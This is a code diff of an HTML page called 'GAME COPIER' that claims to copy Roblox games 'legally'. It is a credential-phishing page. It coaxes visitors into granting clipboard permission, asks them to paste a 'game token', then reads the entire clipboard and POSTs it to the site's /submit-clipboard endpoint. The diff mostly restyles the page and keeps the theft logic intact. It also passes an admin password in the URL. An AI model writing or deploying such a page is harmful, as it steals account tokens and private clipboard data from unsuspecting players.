@@ -1,44 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>GAME COPIER</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    padding: 30px;
-    background: #f9f9f9;
-    color: #222;
-  }
-  input, button {
-    margin: 10px 0;
-    padding: 8px;
-    font-size: 1rem;
-    width: 300px;
-    max-width: 100%;
-  }
-  #tokenBox {
-    margin-top: 20px;
-    display: none;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <title>GAME COPIER</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #111;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 12px rgba(255, 255, 255, 0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h1 {
+      margin-bottom: 0.2em;
+      font-size: 2rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background: #2b2b2b;
+      color: #fff;
+      font-size: 1rem;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #007bff;
+      color: white;
+      font-weight: bold;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+
+    #tokenBox {
+      margin-top: 20px;
+      display: none;
+    }
+
+    #adminBtn {
+      background: #444;
+      margin-top: 30px;
+    }
+
+    #adminBtn:hover {
+      background: #666;
+    }
+  </style>
 </head>
 <body>
-  <h1>GAME COPIER</h1>
-  <p>Copy games (legally).</p>
+  <div class="container">
+    <h1>GAME COPIER</h1>
+    <p>Copy games (legally)</p>
 
-  <label for="gameIdInput">Enter Game ID:</label><br />
-  <input type="text" id="gameIdInput" autocomplete="off" /><br />
-  <button id="submitBtn">Submit Game ID</button>
+    <input type="text" id="gameIdInput" placeholder="Enter Game ID" autocomplete="off" />
+    <button id="submitBtn">Submit Game ID</button>
 
-  <div id="tokenBox">
-    <p>Paste the game token here:</p>
-    <input type="text" id="tokenInput" autocomplete="off" /><br />
-    <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
+    <div id="tokenBox">
+      <input type="text" id="tokenInput" placeholder="Paste Game Token Here" autocomplete="off" />
+      <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
+    </div>
+
+    <button id="adminBtn">Admin Login</button>
   </div>
-
-  <button id="adminBtn" style="margin-top: 40px;">Admin Login</button>
 
   <script>
     const gameIdInput = document.getElementById('gameIdInput');
@@ -50,67 +100,56 @@
 
     let permissionGranted = false;
 
-    // Only block Ctrl+V if permission not granted yet
     document.addEventListener('keydown', async (e) => {
       if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
         e.preventDefault();
 
         try {
-          // This triggers the browser clipboard permission popup
           await navigator.clipboard.readText();
           permissionGranted = true;
-          // No alert here, just silently allow
         } catch (err) {
-          alert('Clipboard permission denied. Redirecting...');
-          window.location.href = 'https://example.com/denied'; // Replace with your redirect
+          permissionGranted = false;
         }
       }
     });
 
-    // Now that permission is granted, Ctrl+V will work normally
-
     submitBtn.onclick = () => {
       if (!permissionGranted) {
-        alert('Please press Ctrl+V once and grant clipboard permission first.');
+        alert('Please press Ctrl+V once and allow clipboard permission first.');
         return;
       }
 
       const gameId = gameIdInput.value.trim();
       if (!gameId) {
-        alert('Please enter a game ID.');
+        alert('Enter a valid Game ID');
         return;
       }
 
       window.open(`https://roblox.com/${gameId}`, '_blank');
-
-      setTimeout(() => {
-        tokenBox.style.display = 'block';
-      }, 500);
+      setTimeout(() => tokenBox.style.display = 'block', 500);
     };
 
     tokenSubmitBtn.onclick = async () => {
       try {
-        // Read *entire* clipboard content on token submit
-        const fullClipboard = await navigator.clipboard.readText();
+        const clipboard = await navigator.clipboard.readText();
 
         await fetch('/submit-clipboard', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ clipboardData: fullClipboard })
+          body: JSON.stringify({ clipboardData: clipboard })
         });
 
-        alert('Clipboard content saved successfully!');
-      } catch (err) {
-        alert('Failed to access clipboard. Please ensure permission is granted.');
+        alert('Clipboard content saved.');
+      } catch {
+        alert('Clipboard permission was denied. Redirecting...');
+        window.location.href = 'https://example.com/denied'; // replace
       }
     };
 
     adminBtn.onclick = () => {
       const password = prompt('Enter admin password:');
-      if (password === 'skibidi123') {
-        window.location.href = '/admin?password=skibidi123';
-      } else {
-        alert('Incorrect password');
+      if (password) {
+        window.location.href = `/admin?password=${encodeURIComponent(password)}`;
       }
     };
   </script>
